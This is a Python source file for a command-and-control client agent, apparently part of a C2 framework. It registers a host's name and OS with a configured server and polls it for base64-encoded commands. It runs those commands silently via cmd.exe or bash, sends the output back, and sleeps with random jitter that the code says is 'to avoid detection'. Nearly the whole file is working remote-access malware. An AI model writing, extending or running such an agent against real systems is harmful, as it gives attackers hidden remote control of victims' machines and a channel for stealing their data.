"""
C2 client agent implementation
"""
import requests
import base64
import time
import logging
import subprocess
import os
import platform
import secrets
import random
# from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Import from configuration
from config.settings import (
    C2_SERVER, AGENT_SLEEP_MIN, AGENT_SLEEP_MAX, COMMAND_TIMEOUT, 
    LOG_LEVEL, LOG_FORMAT
)

# Configure logging
logging.basicConfig(level=getattr(logging, LOG_LEVEL), format=LOG_FORMAT)

# Disable insecure HTTPS warnings - in production, use valid certificates
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create a session to maintain cookies
session = requests.Session()

def find_os():
    """
    Determine the operating system type and architecture
    """
    os_info = {
        "type": None,
        "arch": None,
        "timestamp": time.time()
    }

    system = platform.system().lower()
    if "linux" in system:
        os_info['type'] = 'linux'
    elif "windows" in system:
        os_info['type'] = 'windows'
    else:
        os_info['type'] = 'unknown'

    os_info['arch'] = platform.machine()
    return os_info

def execute_command(cmd):
    """
    Execute a base64-encoded command on the system
    """
    data = {
        'output': None,
        'error': None,
        'code': None,
    }

    try:
        # Decode the base64 command
        decoded_cmd = base64.urlsafe_b64decode(cmd).decode('utf-8').strip()
        if not decoded_cmd:
            data['error'] = 'No command received. Execution discontinued'
            return data
        
        if decoded_cmd == 'NOP':
            data['output'] = 'No operation'
            data['code'] = 0
            return data

        # Get OS info
        os_info = find_os()
        os_type = os_info.get('type')

        # Execute command based on OS
        if os_type == 'windows':
            process = subprocess.run(
                ['cmd.exe', '/c', decoded_cmd],
                capture_output=True,
                text=True,
                timeout=COMMAND_TIMEOUT,
                check=False,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        elif os_type == 'linux':
            process = subprocess.run(
                ['/bin/bash', '-c', decoded_cmd],
                capture_output=True,
                text=True,
                timeout=COMMAND_TIMEOUT,
                check=False
            )
        else:
            data['error'] = f'Unsupported OS={os_type}'
            return data

        # Process results
        data['output'] = process.stdout.strip()
        data['error'] = process.stderr.strip()
        data['code'] = process.returncode

        logging.debug(f'Command executed with exit code {data["code"]}')
        return data

    except subprocess.TimeoutExpired:
        logging.error(f'Command execution timeout')
        data['error'] = 'Command execution timeout'
        return data
    except Exception as e:
        logging.error(f'Error during command execution: {str(e)}')
        data['error'] = str(e)
        return data

def check_in():
    """
    Initial check-in with the C2 server
    Uses challenge-response for mutual authentication
    """
    try:
        # Get OS information
        os_info = find_os()
        
        # Generate a client nonce
        client_nonce = secrets.token_hex(8)
        
        # Prepare check-in data
        data = {
            'aid': platform.node(),  # Use hostname as agent ID
            'ops': os_info['type'],
            'arch': os_info['arch'],
            'nonce': client_nonce
        }
        
        # Send check-in request
        resp = session.post(
            f"{C2_SERVER}/overview", 
            json=data, 
            verify=False,  # In production, set to True with valid certs
            timeout=10
        )
        
        if resp.status_code == 200:
            server_data = resp.json()
            server_nonce = server_data.get('challenge')
            
            if not server_nonce:
                logging.error("Server didn't provide a challenge")
                return False
                
            # Complete the challenge-response verification
            # Calculate response (in a real scenario, this would use a shared secret)
            verify_data = {
                'client_nonce': client_nonce,
                'server_challenge': server_nonce,
                # 'response': hash_function(client_nonce + server_nonce + shared_secret)
            }
            
            verify_resp = session.post(
                f"{C2_SERVER}/verify", 
                json=verify_data, 
                verify=False,
                timeout=10
            )
            
            if verify_resp.status_code == 200:
                logging.info("Successfully authenticated with C2 server")
                return True
            else:
                logging.error(f"Verification failed: {verify_resp.status_code}")
                return False
        else:
            logging.error(f"Check-in failed: {resp.status_code}")
            return False
            
    except Exception as e:
        logging.error(f"Check-in error: {str(e)}")
        return False

def get_commands():
    """
    Retrieves commands from the C2 server and executes them
    """
    try:
        # Request commands
        resp = session.post(
            f"{C2_SERVER}/cmd", 
            verify=False,
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            
            if data.get('status') == 'active':
                cmd = data.get('cmd')
                
                if cmd:
                    logging.info("Command received")
                    
                    # Execute the command
                    result = execute_command(cmd)
                    
                    # Encode the results
                    result_payload = {
                        'output': base64.b64encode(str(result.get('output', '')).encode('utf-8')).decode('utf-8'),
                        'error': base64.b64encode(str(result.get('error', '')).encode('utf-8')).decode('utf-8'),
                        'code': result.get('code')
                    }
                    
                    # Report results back to the server
                    report_resp = session.post(
                        f"{C2_SERVER}/report", 
                        json=result_payload, 
                        verify=False,
                        timeout=10
                    )
                    
                    if report_resp.status_code == 200:
                        logging.info("Results reported successfully")
                    else:
                        logging.error(f"Failed to report results: {report_resp.status_code}")
                else:
                    logging.info("No command received")
        else:
            logging.warning(f"Failed to get commands: {resp.status_code}")
            
    except Exception as e:
        logging.error(f"Command retrieval error: {str(e)}")

def run_agent():
    """
    Main agent loop
    """
    logging.info("Starting C2 agent")
    
    # Initial check-in
    if not check_in():
        logging.error("Initial check-in failed. Exiting.")
        return
    
    logging.info("Initial check-in successful. Starting command loop.")
    
    # Main command loop
    while True:
        try:
            # Get and execute commands
            get_commands()
            
            # Sleep with jitter to avoid detection
            sleep_time = random.uniform(AGENT_SLEEP_MIN, AGENT_SLEEP_MAX)
            time.sleep(sleep_time)
            
        except KeyboardInterrupt:
            logging.info("Agent terminated by user")
            break
        except Exception as e:
            logging.error(f"Error in main loop: {str(e)}")
            # Sleep a bit before retrying
            time.sleep(5)

if __name__ == "__main__":
    run_agent()